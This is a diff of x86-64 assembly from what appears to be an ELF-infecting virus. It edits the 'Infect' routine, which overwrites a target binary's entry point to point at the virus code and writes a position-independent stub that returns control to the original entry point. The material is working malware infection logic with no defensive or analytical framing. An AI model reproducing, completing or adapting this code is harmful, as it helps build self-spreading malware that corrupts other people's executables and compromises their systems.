@@ -261,8 +261,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   
   ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
-  ; mov   rbx,  r10
-  add   r10,  0xc000000 ; was rbx not r10
+  add   r10,  0xc000000
   mov   dword [rdx + elf64_hdr.e_entry], r10d            ; patch entry
   
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
@@ -272,13 +271,6 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   rbx,  [rsp]   
   add   rbx,  [rsp + VX_CTX.qEof]
   add   rbx,  rcx
-
-  ; mov   byte  [rbx + 0],    0x48
-  ; mov   byte  [rbx + 1],    0xB8                        ; mov rax, ?? ---.
-  ; mov   rcx,  [rsp + VX_CTX.qOldEntry]                  ;                |
-  ; mov   qword [rbx + 2],    rcx                         ; mov rax, OEP <-'
-  ; mov   byte  [rbx + 10],   0xFF 
-  ; mov   byte  [rbx + 11],   0xE0                        ; jmp rax
 
   mov   dword   [rbx + 0],  0x000000e8  ; call $+5
   mov   word    [rbx + 4],  0x5800      ; pop rax   ; rax = RIP
